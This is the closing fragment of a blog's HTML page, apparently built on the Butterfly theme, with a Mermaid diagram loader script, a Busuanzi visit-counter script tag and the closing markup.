  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>